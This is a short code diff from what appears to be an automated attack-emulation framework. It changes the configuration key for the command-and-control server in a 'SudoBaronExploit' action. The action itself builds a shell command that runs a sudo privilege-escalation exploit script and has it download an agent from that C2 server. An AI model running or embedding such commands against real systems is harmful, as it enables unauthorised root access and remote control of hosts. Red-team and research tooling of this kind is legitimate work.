@@ -9,7 +9,7 @@ from incalmo.core.models.events import Event
 
 class SudoBaronExploit(LowLevelAction):
     def __init__(self, agent: Agent):
-        server = ConfigService().get_config().c2c_server
+        server = ConfigService().get_config().agent_c2c_server
         command = f"echo '/bin/bash downloadAgent.sh {server}' | python3 sudo_baron_exploit.py"
         payloads = ["sudo_baron_exploit.py", "downloadAgent.sh"]
         super().__init__(agent, command, payloads)
